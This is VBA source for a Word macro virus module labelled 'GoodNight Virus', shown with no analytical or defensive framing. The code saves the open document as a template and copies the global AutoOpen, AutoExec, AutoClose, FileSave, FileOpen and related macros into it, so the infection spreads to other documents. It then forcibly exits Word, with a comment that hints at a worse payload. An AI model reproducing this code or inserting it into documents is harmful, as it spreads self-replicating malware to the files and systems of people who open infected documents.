   Attribute VB_Name = "Exit_"

   Public Sub MAIN()
   Dim DocName$
   'GoodNight Virus

   On Error GoTo -1: On Error GoTo bail
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   WordBasic.FileSaveAs dlg

   DocName$ = WordBasic.[FileName$]()
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "Global:AutoExec", DocName$ + ":AutoExec"
   WordBasic.MacroCopy "Global:AutoExit", DocName$ + ":AutoExit"
   WordBasic.MacroCopy "Global:AutoClose", DocName$ + ":AutoClose"
   WordBasic.MacroCopy "Global:FileClose", DocName$ + ":FileClose"
   WordBasic.MacroCopy "Global:FileCloseAll", DocName$ + ":FileCloseAll"
   WordBasic.MacroCopy "Global:FileSave", DocName$ + ":FileSave"
   WordBasic.MacroCopy "Global:FileSaveAs", DocName$ + ":FileSaveAs"
   WordBasic.MacroCopy "Global:FileOpen", DocName$ + ":FileOpen"
   WordBasic.MacroCopy "Global:AutoOpen", DocName$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:Exit", DocName$ + ":Exit"
   bail:

   WordBasic.FileExit           'Just a taste of what is to come!
   End Sub
